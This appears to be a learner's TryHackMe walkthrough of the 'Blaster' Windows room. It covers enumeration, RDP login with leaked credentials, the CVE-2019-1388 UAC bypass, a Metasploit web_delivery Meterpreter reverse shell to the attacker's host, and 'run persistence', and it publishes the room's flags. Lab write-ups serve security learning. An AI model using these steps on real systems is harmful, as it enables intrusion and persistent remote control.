
# 🎮 **Blaster — Windows Exploitation Case Report**

TryHackMe Walkthrough • RDP Access • CVE-2019-1388 • Privilege Escalation • Persistence

---
📝 Author’s Note

I am still new to persistence and post-exploitation.
Some parts of this challenge required me to reference walkthroughs and use AI assistance to fully understand the exploitation steps — especially for privilege escalation and persistence. 😏😏
This report documents my learning process and progression as I build real hacking skills.
---

## 🧭 Overview

This report documents the full compromise of the **Blaster** room on TryHackMe.
The challenge focuses on manual enumeration, identifying exposed information on a web server, gaining RDP access, exploiting a Windows privilege-escalation vulnerability (**CVE-2019-1388**), and establishing persistence using Metasploit’s script delivery system.

Techniques used:

* Service enumeration (Nmap)
* Directory fuzzing (Gobuster)
* Credential discovery via blog posts
* Remote Desktop login (RDP)
* Privilege escalation using a misconfigured UAC + signed binary (CVE-2019-1388)
* Meterpreter reverse shell (web_delivery)
* Persistence via Metasploit

---

## 🏷️ **Case Summary**

| Field                | Details                                  |
| -------------------- | ---------------------------------------- |
| Room Name            | Blaster                                  |
| Target Type          | Windows Server                           |
| Goal                 | Full system compromise + persistence     |
| Initial Access       | Exposed username + password (blog posts) |
| Privilege Escalation | CVE-2019-1388 Exploit                    |
| Persistence          | Meterpreter `run persistence -X`         |

---

# 🐾 **Task 1 — Mission Start**

The target is deployed and requires several minutes before fully booting.

(No answers required.)

---

# 🐾 **Task 2 — Forward Scanners Activated**

### 🎯 **Goal:** Enumerate exposed services and identify a foothold.

### 🔍 Service Enumeration (Nmap)

```bash
nmap -Pn -sV <TARGET-IP>
```

**Result:**
**2 open ports** detected.

### 🔍 Web Enumeration

Navigating to the HTTP service reveals the page title:

```
IIS Windows Server
```

### 🔍 Directory Fuzzing (Gobuster)

```bash
gobuster dir -u http://<TARGET-IP> -w /usr/share/wordlists/dirb/common.txt
```

**Hidden directory discovered:**

```
/retro
```

### 🔍 Username Discovery

Inside `/retro`, a blog reference reveals a potential username:

```
wade
```

### 🔍 Password Discovery

Scrolling through blog posts shows a user complaining about login issues.
Password found:

```
parzival
```

### 🎯 RDP Login

Using Remmina:

* **Username:** wade
* **Password:** parzival

After logging in, read:

```
C:\Users\wade\Desktop\user.txt
```

**Flag:**
`THM{HACK_PLAYER_ONE}`

---

# 🐾 **Task 3 — Breaching the Control Room**

### 🎯 **Goal:** Enumerate the Windows machine for privilege escalation paths.

### 🔍 Last User Activity

Inspecting the desktop and downloads reveals research material referencing:

```
CVE-2019-1388
```

This is a known UAC bypass involving a signed elevated binary calling a non-elevated browser.

### 🔍 Exploit Artifact

An executable left behind by the user is required for the exploit.

File found:

```
hhupd.exe
```

(Exact name varies depending on the room version.)

### 🧨 Exploitation Process

Following the known CVE-2019-1388 technique:

1. Launch the executable.
2. Use the “Run as administrator” prompt behavior.
3. Abuse the “Learn more” link to spawn an elevated browser.
4. From the elevated shell, spawn `cmd.exe`.

### ✔ Elevated Shell Obtained

Command:

```cmd
whoami
```

Output:

```
nt authority\system
```

### 🔑 Retrieve Root Flag

```
C:\Users\Administrator\Desktop\root.txt
```

**Flag:**
`THM{COIN_OPERATED_EXPLOITATION}`

---

# 🐾 **Task 4 — Adoption into the Collective**

### 🎯 **Goal:** Deliver a remote Meterpreter payload and set persistence.

We return to our attacker machine and use **Metasploit’s script web delivery module**.

### 🔥 Step 1 — Select Module

```bash
use exploit/multi/script/web_delivery
```

### 🔥 Step 2 — Set Target to PowerShell

Target number:

```
2
```

Command:

```bash
set target 2
```

### 🔥 Step 3 — Configure Payload

```bash
set payload windows/meterpreter/reverse_http
set lhost <YOUR-THM-IP>
set lport 8080
run -j
```

Metasploit outputs a long PowerShell command.
Execute this in the *SYSTEM shell* obtained from the CVE exploit.

This spawns a fully interactive **Meterpreter session**.

---

## 🛠️ Persistence Setup

Inside Meterpreter:

```bash
run persistence -X
```

This installs a persistent service that:

* runs at system startup
* automatically reconnects to your listener

(Requires a handler listener in practice.)

---

# 🧩 **Final Conclusion**

The Blaster machine demonstrates how weak security hygiene and leftover artifacts enable full compromise:

✔ Poor credential hygiene exposed on a public blog
✔ Weak RDP login
✔ High-impact local privilege escalation (CVE-2019-1388)
✔ Full SYSTEM access
✔ Meterpreter shell delivered through PowerShell
✔ Persistence established (`run persistence -X`)

You achieved complete control over the host from initial enumeration to long-term persistence.

